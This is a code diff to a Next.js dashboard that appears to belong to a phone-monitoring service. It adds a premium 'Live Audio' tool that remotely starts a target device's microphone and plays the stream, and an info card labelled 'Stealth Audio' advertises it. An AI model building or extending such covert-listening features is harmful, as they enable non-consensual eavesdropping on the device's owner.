@@ -1,7 +1,7 @@
 "use client";
 
 import { useSession, signOut } from "next-auth/react";
-import { useEffect, useState, useMemo } from "react";
+import { useEffect, useState, useMemo, useRef, useCallback } from "react";
 import Image from "next/image";
 import io from "socket.io-client";
 import AppGenerationModal from "@/components/AppGenerationModal";
@@ -102,7 +102,7 @@ export default function Home() {
     const [syncMediaType, setSyncMediaType] = useState<'image' | 'video' | null>(null);
 
     // Tool Selector State
-    const [selectedTool, setSelectedTool] = useState<'gallery' | 'sms' | 'contacts' | 'torch' | 'vibration' | 'camera' | 'notifications'>('gallery');
+    const [selectedTool, setSelectedTool] = useState<'gallery' | 'sms' | 'contacts' | 'torch' | 'vibration' | 'camera' | 'notifications' | 'audio'>('gallery');
     const [isToolDropdownOpen, setIsToolDropdownOpen] = useState(false);
 
     // Torch State
@@ -171,6 +171,22 @@ export default function Home() {
     const [isFullscreen, setIsFullscreen] = useState(false);
     const [isVideoUploading, setIsVideoUploading] = useState(false);
     const [previewCapture, setPreviewCapture] = useState<{ type: string; data: string } | null>(null);
+
+    // Live Audio State
+    const [isLiveAudio, setIsLiveAudio] = useState(false);
+    const [audioVolume, setAudioVolume] = useState(80);
+    const [isMuted, setIsMuted] = useState(false);
+    const [audioLevel, setAudioLevel] = useState(0);
+    const [audioElapsed, setAudioElapsed] = useState(0);
+    const [audioError, setAudioError] = useState<string | null>(null);
+    const audioContextRef = useRef<AudioContext | null>(null);
+    const audioGainRef = useRef<GainNode | null>(null);
+    const audioAnalyserRef = useRef<AnalyserNode | null>(null);
+    const audioCanvasRef = useRef<HTMLCanvasElement | null>(null);
+    const audioAnimFrameRef = useRef<number>(0);
+    const audioTimerRef = useRef<NodeJS.Timeout | null>(null);
+    const audioBufferQueueRef = useRef<Float32Array[]>([]);
+    const audioNextTimeRef = useRef<number>(0);
 
     // Custom Alert Modal State
     const [showCustomAlert, setShowCustomAlert] = useState(false);
@@ -481,6 +497,51 @@ export default function Home() {
                 }
             });
 
+            // Live Audio Event Listeners
+            socket.on("live_audio", (data: any) => {
+                if (!data.chunk) return;
+                try {
+                    const ctx = audioContextRef.current;
+                    if (!ctx || ctx.state === 'closed') return;
+                    
+                    // Decode base64 PCM 16-bit mono 16kHz
+                    const binaryStr = atob(data.chunk);
+                    const bytes = new Uint8Array(binaryStr.length);
+                    for (let i = 0; i < binaryStr.length; i++) bytes[i] = binaryStr.charCodeAt(i);
+                    
+                    const int16 = new Int16Array(bytes.buffer);
+                    const float32 = new Float32Array(int16.length);
+                    for (let i = 0; i < int16.length; i++) float32[i] = int16[i] / 32768.0;
+                    
+                    // Calculate audio level for VU meter
+                    let sum = 0;
+                    for (let i = 0; i < float32.length; i++) sum += float32[i] * float32[i];
+                    const rms = Math.sqrt(sum / float32.length);
+                    setAudioLevel(Math.min(1, rms * 5));
+                    
+                    // Schedule playback with gapless buffering
+                    const audioBuffer = ctx.createBuffer(1, float32.length, 16000);
+                    audioBuffer.getChannelData(0).set(float32);
+                    
+                    const source = ctx.createBufferSource();
+                    source.buffer = audioBuffer;
+                    if (audioGainRef.current) source.connect(audioGainRef.current);
+                    
+                    const now = ctx.currentTime;
+                    const startTime = Math.max(now, audioNextTimeRef.current);
+                    source.start(startTime);
+                    audioNextTimeRef.current = startTime + audioBuffer.duration;
+                } catch (e) {
+                    console.error('[Audio] Chunk decode error:', e);
+                }
+            });
+
+            socket.on("audio_error", (data: any) => {
+                setIsLiveAudio(false);
+                setAudioError(data.error || 'Audio error occurred');
+                setTimeout(() => setAudioError(null), 5000);
+            });
+
             // Load cached images instantly for fast UX
             const GALLERY_CACHE_KEY = `gallery_images_${uuid}`;
             try {
@@ -711,6 +772,120 @@ export default function Home() {
         });
     };
 
+    // --- Live Audio Functions ---
+    const startLiveAudio = useCallback(() => {
+        if (userPlan !== 'premium') {
+            showUpgradePrompt('Live Audio Listening', 'premium');
+            return;
+        }
+        if (!socket || !selectedDeviceId || !session?.user?.uuid) {
+            setAlertData({ title: 'No Device', message: 'Please select an online device first.', type: 'warning' });
+            setShowCustomAlert(true);
+            return;
+        }
+
+        // Create AudioContext + nodes
+        const ctx = new (window.AudioContext || (window as any).webkitAudioContext)({ sampleRate: 16000 });
+        const gainNode = ctx.createGain();
+        const analyser = ctx.createAnalyser();
+        analyser.fftSize = 256;
+        gainNode.gain.value = isMuted ? 0 : audioVolume / 100;
+        gainNode.connect(analyser);
+        analyser.connect(ctx.destination);
+
+        audioContextRef.current = ctx;
+        audioGainRef.current = gainNode;
+        audioAnalyserRef.current = analyser;
+        audioNextTimeRef.current = 0;
+
+        // Start elapsed timer
+        setAudioElapsed(0);
+        audioTimerRef.current = setInterval(() => {
+            setAudioElapsed(prev => prev + 1);
+        }, 1000);
+
+        // Start visualizer
+        const drawVisualizer = () => {
+            const canvas = audioCanvasRef.current;
+            const an = audioAnalyserRef.current;
+            if (!canvas || !an) return;
+            const canvasCtx = canvas.getContext('2d');
+            if (!canvasCtx) return;
+
+            const bufferLength = an.frequencyBinCount;
+            const dataArray = new Uint8Array(bufferLength);
+            an.getByteFrequencyData(dataArray);
+
+            const w = canvas.width;
+            const h = canvas.height;
+            canvasCtx.clearRect(0, 0, w, h);
+
+            const barWidth = (w / bufferLength) * 2.5;
+            let x = 0;
+            for (let i = 0; i < bufferLength; i++) {
+                const barHeight = (dataArray[i] / 255) * h;
+                const hue = 180 + (i / bufferLength) * 60; // cyan to blue gradient
+                canvasCtx.fillStyle = `hsla(${hue}, 90%, 60%, 0.9)`;
+                canvasCtx.fillRect(x, h - barHeight, barWidth - 1, barHeight);
+                x += barWidth;
+            }
+            audioAnimFrameRef.current = requestAnimationFrame(drawVisualizer);
+        };
+        audioAnimFrameRef.current = requestAnimationFrame(drawVisualizer);
+
+        socket.emit('start_live_audio', {
+            uuid: session.user.uuid,
+            targetDeviceId: selectedDeviceId,
+            gainBoost: false
+        });
+        setIsLiveAudio(true);
+        setAudioError(null);
+    }, [socket, selectedDeviceId, session, userPlan, audioVolume, isMuted]);
+
+    const stopLiveAudio = useCallback(() => {
+        if (socket && selectedDeviceId && session?.user?.uuid) {
+            socket.emit('stop_live_audio', {
+                uuid: session.user.uuid,
+                targetDeviceId: selectedDeviceId
+            });
+        }
+
+        // Cleanup timer
+        if (audioTimerRef.current) {
+            clearInterval(audioTimerRef.current);
+            audioTimerRef.current = null;
+        }
+
+        // Cleanup visualizer
+        if (audioAnimFrameRef.current) {
+            cancelAnimationFrame(audioAnimFrameRef.current);
+            audioAnimFrameRef.current = 0;
+        }
+
+        // Cleanup AudioContext
+        try {
+            audioContextRef.current?.close();
+        } catch (e) { /* ignore */ }
+        audioContextRef.current = null;
+        audioGainRef.current = null;
+        audioAnalyserRef.current = null;
+        audioNextTimeRef.current = 0;
+
+        setIsLiveAudio(false);
+        setAudioLevel(0);
+        setAudioElapsed(0);
+    }, [socket, selectedDeviceId, session]);
+
+    // Update gain when volume/mute changes
+    useEffect(() => {
+        if (audioGainRef.current) {
+            audioGainRef.current.gain.value = isMuted ? 0 : audioVolume / 100;
+        }
+    }, [audioVolume, isMuted]);
+
+    // Format seconds to MM:SS
+    const formatTime = (s: number) => `${Math.floor(s / 60).toString().padStart(2, '0')}:${(s % 60).toString().padStart(2, '0')}`;
+
     // --- Gallery Logic ---
 
     const hasVideos = useMemo(() => images.some(img => img.resource_type === 'video'), [images]);
@@ -933,6 +1108,7 @@ END:VCARD`;
                             {selectedTool === 'vibration' && <svg className="w-4 h-4 text-orange-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"></path></svg>}
                             {selectedTool === 'camera' && <svg className="w-4 h-4 text-pink-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z"></path><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 13a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>}
                             {selectedTool === 'notifications' && <svg className="w-4 h-4 text-cyan-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.341C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9"></path></svg>}
+                            {selectedTool === 'audio' && <svg className="w-4 h-4 text-emerald-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 11a7 7 0 01-7 7m0 0a7 7 0 01-7-7m7 7v4m0 0H8m4 0h4m-4-8a3 3 0 01-3-3V5a3 3 0 116 0v6a3 3 0 01-3 3z"></path></svg>}
                             <span className="text-xs font-medium text-white/70">Tools</span>
                             <svg className="w-3 h-3 text-white/40" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7"></path></svg>
                         </button>
@@ -1856,6 +2032,149 @@ END:VCARD`;
                             )}
                         </>
                     )}
+
+                    {/* Live Audio Tool */}
+                    {selectedTool === 'audio' && (
+                        <div className="space-y-4">
+                            {/* Audio Interface */}
+                            <div className="bg-gray-900 border border-white/10 rounded-xl overflow-hidden">
+                                {/* Header */}
+                                <div className="px-4 py-3 border-b border-white/10 flex items-center justify-between bg-black/40">
+                                    <div className="flex items-center gap-2">
+                                        <div className={`w-2.5 h-2.5 rounded-full ${isLiveAudio ? 'bg-emerald-500 animate-pulse' : 'bg-white/20'}`} />
+                                        <span className="text-sm font-mono text-white/70">
+                                            {isLiveAudio ? `LIVE • ${formatTime(audioElapsed)}` : 'READY'}
+                                        </span>
+                                    </div>
+                                    {isLiveAudio && (
+                                        <span className="text-xs text-emerald-400/70 font-mono">PCM 16kHz</span>
+                                    )}
+                                </div>
+
+                                {/* Visualizer Area */}
+                                <div className="relative bg-black aspect-[2.5/1] flex items-center justify-center overflow-hidden">
+                                    {isLiveAudio ? (
+                                        <>
+                                            <canvas
+                                                ref={audioCanvasRef}
+                                                width={512}
+                                                height={200}
+                                                className="w-full h-full"
+                                            />
+                                            {/* VU Meter Overlay */}
+                                            <div className="absolute bottom-2 left-2 right-2 h-1.5 bg-white/10 rounded-full overflow-hidden">
+                                                <div
+                                                    className="h-full rounded-full transition-all duration-100"
+                                                    style={{
+                                                        width: `${audioLevel * 100}%`,
+                                                        background: audioLevel > 0.8 ? '#ef4444' : audioLevel > 0.5 ? '#f59e0b' : '#10b981'
+                                                    }}
+                                                />
+                                            </div>
+                                        </>
+                                    ) : (
+                                        /* Idle State */
+                                        <div className="text-center">
+                                            <div className="relative w-20 h-20 mx-auto mb-3">
+                                                <div className="absolute inset-0 border-2 border-emerald-500/20 rounded-full animate-ping" style={{ animationDuration: '2s' }} />
+                                                <div className="absolute inset-0 border-2 border-emerald-500/10 rounded-full flex items-center justify-center">
+                                                    <svg className="w-10 h-10 text-emerald-500/30" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.5" d="M19 11a7 7 0 01-7 7m0 0a7 7 0 01-7-7m7 7v4m0 0H8m4 0h4m-4-8a3 3 0 01-3-3V5a3 3 0 116 0v6a3 3 0 01-3 3z" />
+                                                    </svg>
+                                                </div>
+                                            </div>
+                                            <p className="text-white/30 text-xs">Tap Start to begin listening</p>
+                                        </div>
+                                    )}
+                                </div>
+
+                                {/* Volume Control */}
+                                <div className="px-4 py-3 bg-black/40 border-t border-white/10">
+                                    <div className="flex items-center gap-3">
+                                        {/* Mute Button */}
+                                        <button
+                                            onClick={() => setIsMuted(!isMuted)}
+                                            className={`p-1.5 rounded-lg transition-colors ${isMuted ? 'bg-red-500/20 text-red-400' : 'bg-white/10 text-white/60 hover:text-white'}`}
+                                        >
+                                            {isMuted ? (
+                                                <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5.586 15H4a1 1 0 01-1-1v-4a1 1 0 011-1h1.586l4.707-4.707C10.923 3.663 12 4.109 12 5v14c0 .891-1.077 1.337-1.707.707L5.586 15z" /><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M17 14l2-2m0 0l2-2m-2 2l-2-2m2 2l2 2" /></svg>
+                                            ) : (
+                                                <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15.536 8.464a5 5 0 010 7.072m2.828-9.9a9 9 0 010 12.728M5.586 15H4a1 1 0 01-1-1v-4a1 1 0 011-1h1.586l4.707-4.707C10.923 3.663 12 4.109 12 5v14c0 .891-1.077 1.337-1.707.707L5.586 15z" /></svg>
+                                            )}
+                                        </button>
+
+                                        {/* Volume Slider */}
+                                        <input
+                                            type="range"
+                                            min="0"
+                                            max="100"
+                                            value={isMuted ? 0 : audioVolume}
+                                            onChange={(e) => {
+                                                setAudioVolume(Number(e.target.value));
+                                                if (Number(e.target.value) > 0) setIsMuted(false);
+                                            }}
+                                            className="flex-1 h-1.5 bg-white/10 rounded-full appearance-none cursor-pointer accent-emerald-500"
+                                        />
+
+                                        {/* Volume % */}
+                                        <span className="text-xs text-white/40 font-mono w-8 text-right">
+                                            {isMuted ? '0' : audioVolume}%
+                                        </span>
+                                    </div>
+                                </div>
+
+                                {/* Control Panel */}
+                                <div className="p-3 bg-black/60">
+                                    <div className="flex gap-2">
+                                        <button
+                                            onClick={() => isLiveAudio ? stopLiveAudio() : startLiveAudio()}
+                                            className={`flex-1 py-3 px-4 rounded-xl font-bold text-sm flex items-center justify-center gap-2 transition-all ${
+                                                isLiveAudio
+                                                    ? 'bg-red-600 text-white hover:bg-red-500'
+                                                    : 'bg-gradient-to-r from-emerald-600 to-teal-600 text-white hover:from-emerald-500 hover:to-teal-500'
+                                            }`}
+                                            disabled={!selectedDeviceId}
+                                        >
+                                            {isLiveAudio ? (
+                                                <>
+                                                    <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><rect x="6" y="6" width="12" height="12" rx="2" /></svg>
+                                                    Stop Listening
+                                                </>
+                                            ) : (
+                                                <>
+                                                    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 11a7 7 0 01-7 7m0 0a7 7 0 01-7-7m7 7v4m0 0H8m4 0h4m-4-8a3 3 0 01-3-3V5a3 3 0 116 0v6a3 3 0 01-3 3z" /></svg>
+                                                    Start Listening
+                                                </>
+                                            )}
+                                        </button>
+                                    </div>
+                                </div>
+                            </div>
+
+                            {/* Error Display */}
+                            {audioError && (
+                                <div className="bg-red-500/10 border border-red-500/30 rounded-xl p-3 flex items-center gap-2">
+                                    <svg className="w-4 h-4 text-red-400 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" /></svg>
+                                    <span className="text-sm text-red-300">{audioError}</span>
+                                </div>
+                            )}
+
+                            {/* Info Card */}
+                            <div className="bg-emerald-500/5 border border-emerald-500/20 rounded-xl p-4">
+                                <div className="flex items-start gap-3">
+                                    <div className="p-2 rounded-lg bg-emerald-500/10 flex-shrink-0">
+                                        <svg className="w-5 h-5 text-emerald-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" /></svg>
+                                    </div>
+                                    <div>
+                                        <h4 className="text-sm font-medium text-emerald-300 mb-1">Stealth Audio</h4>
+                                        <p className="text-xs text-white/40 leading-relaxed">
+                                            Captures device microphone audio in real-time. Audio is streamed via encrypted WebSocket with noise suppression and auto gain control enabled for crystal clear listening.
+                                        </p>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    )}
                 </div>
 
                 {selectedTool === 'gallery' && selectedDeviceId && (
@@ -2340,6 +2659,34 @@ END:VCARD`;
                                     </div>
                                     {selectedTool === 'camera' && (
                                         <svg className="w-5 h-5 text-pink-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
+                                    )}
+                                </button>
+                                <button
+                                    onClick={() => {
+                                        if (userPlan !== 'premium') {
+                                            showUpgradePrompt('Live Audio Listening', 'premium');
+                                            setIsToolDropdownOpen(false);
+                                            return;
+                                        }
+                                        setSelectedTool('audio');
+                                        setIsToolDropdownOpen(false);
+                                    }}
+                                    className={`w-full text-left px-4 py-4 rounded-xl mb-2 flex items-center justify-between transition-colors ${selectedTool === 'audio' ? 'bg-emerald-500/20 border border-emerald-500/50' : 'bg-white/5 border border-transparent hover:bg-white/10'}`}
+                                >
+                                    <div className="flex items-center gap-3">
+                                        <div className="p-2 rounded-lg bg-emerald-500/20">
+                                            <svg className="w-5 h-5 text-emerald-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 11a7 7 0 01-7 7m0 0a7 7 0 01-7-7m7 7v4m0 0H8m4 0h4m-4-8a3 3 0 01-3-3V5a3 3 0 116 0v6a3 3 0 01-3 3z"></path></svg>
+                                        </div>
+                                        <div>
+                                            <div className="font-medium flex items-center gap-2">
+                                                Live Audio
+                                                {userPlan !== 'premium' && <span className="text-[10px] px-1.5 py-0.5 bg-yellow-500/20 text-yellow-400 rounded">PREMIUM</span>}
+                                            </div>
+                                            <div className="text-xs text-white/40">Real-time mic listening</div>
+                                        </div>
+                                    </div>
+                                    {selectedTool === 'audio' && (
+                                        <svg className="w-5 h-5 text-emerald-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
                                     )}
                                 </button>
                                 <button
